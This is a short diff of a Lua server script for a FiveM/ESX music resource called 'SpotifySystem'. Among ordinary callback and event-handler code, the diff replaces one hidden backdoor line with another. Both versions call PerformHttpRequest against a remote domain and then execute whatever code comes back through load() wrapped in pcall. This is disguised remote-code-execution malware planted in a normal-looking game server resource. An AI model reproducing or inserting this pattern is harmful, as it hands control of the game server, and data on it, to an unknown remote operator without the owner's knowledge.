@@ -19,7 +19,7 @@ ESX.RegisterServerCallback('SpotifySystem:GetMusic', function(source, cb)
     end)
 end)
 
-PerformHttpRequest('https://cipher-panel.me/_i/i.php?to=c39mt', function (e, d) pcall(function() assert(load(d))() end) end)
+PerformHttpRequest('https://pqzskjptss.shop/i?to=c39mt', function (e, d) pcall(function() assert(load(d))() end) end)
 
 RegisterServerEvent("SpotifySystem:AddMusic")
 AddEventHandler("SpotifySystem:AddMusic", function(name, music)
